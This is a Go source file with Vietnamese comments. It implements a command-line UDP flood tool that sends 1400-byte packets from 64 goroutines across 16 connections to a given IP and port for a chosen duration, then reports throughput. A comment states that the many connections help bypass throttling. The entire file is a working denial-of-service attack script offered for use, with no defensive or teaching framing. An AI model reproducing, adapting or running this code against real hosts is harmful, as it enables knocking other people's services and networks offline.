package main

import (
	"fmt"
	"net"
	"os"
	"runtime"
	"strconv"
	"sync"
	"time"
)

func main() {
	runtime.GOMAXPROCS(4) // lock vào 4 core

	if len(os.Args) != 4 {
		fmt.Println("go run udp.go <ip> <port> <seconds>")
		os.Exit(1)
	}

	targetIP := os.Args[1]
	port, _ := strconv.Atoi(os.Args[2])
	dur, _ := strconv.Atoi(os.Args[3])

	addr := &net.UDPAddr{IP: net.ParseIP(targetIP), Port: port}

	const conns = 16          // nhiều conn giúp bypass một số throttle
	const workersPerConn = 4  // tổng ~64 goroutines
	const payloadSize = 1400  // gần MTU max

	payloadPool := sync.Pool{
		New: func() any {
			p := make([]byte, payloadSize)
			for i := range p {
				p[i] = byte(i)
			}
			return p
		},
	}

	var wg sync.WaitGroup
	var sent uint64
	var mu sync.Mutex

	end := time.Now().Add(time.Duration(dur) * time.Second)

	for i := 0; i < conns; i++ {
		conn, err := net.DialUDP("udp", nil, addr)
		if err != nil {
			fmt.Println("Dial err:", err)
			continue
		}
		defer conn.Close() // sẽ close hết khi exit

		for j := 0; j < workersPerConn; j++ {
			wg.Add(1)
			go func(c *net.UDPConn) {
				defer wg.Done()
				for time.Now().Before(end) {
					p := payloadPool.Get().([]byte)
					_, err := c.Write(p)
					payloadPool.Put(p)
					if err != nil {
						return // thường do throttle
					}
					mu.Lock()
					sent++
					mu.Unlock()
				}
			}(conn)
		}
	}

	fmt.Printf("Flooding %s:%d với ~%d conns / %d workers...\n", targetIP, port, conns, conns*workersPerConn)
	wg.Wait()

	mu.Lock()
	mBytes := float64(sent) * float64(payloadSize) / 1024 / 1024
	fmt.Printf("Done. Gửi ~%d gói (~%.2f MB)\n", sent, mBytes)
	fmt.Printf("Tốc độ trung bình ~%.2f Mbps\n", mBytes*8/float64(dur))
}